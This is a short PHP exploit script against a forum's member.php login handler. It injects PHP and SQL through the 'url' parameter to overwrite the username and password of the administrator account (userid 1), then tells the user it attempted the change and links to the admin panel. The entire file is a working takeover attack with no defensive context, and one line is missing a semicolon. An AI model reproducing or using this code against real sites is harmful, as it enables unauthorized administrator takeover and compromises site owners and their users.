<?php
$one = "member.php?action=login&username=";
$two = '&url=\");".$users=$DB_site->query("';
$three = "update+user+set+username='";
$four = "',+password='";
$five = "'+WHERE+userid='1'\").\""
$open = $url.$one.stripslashes($validuser)."&password=".stripslashes($validpass).$two.$three.stripslashes($username).$four.stripslashes($password).$five;

$fp = fopen($open, "r");
sleep(10);
fclose($fp);
?>
attempted to set board admin username to <?php echo stripslashes($username);?>.<br>
attempted to set board admin password to <?php echo stripslashes($password);?>.<br>
to admin system you should go to <a href="<?php echo stripslashes($url);?>admin/index.php"><?php echo stripslashes($url);?>admin/index.php</a><br>
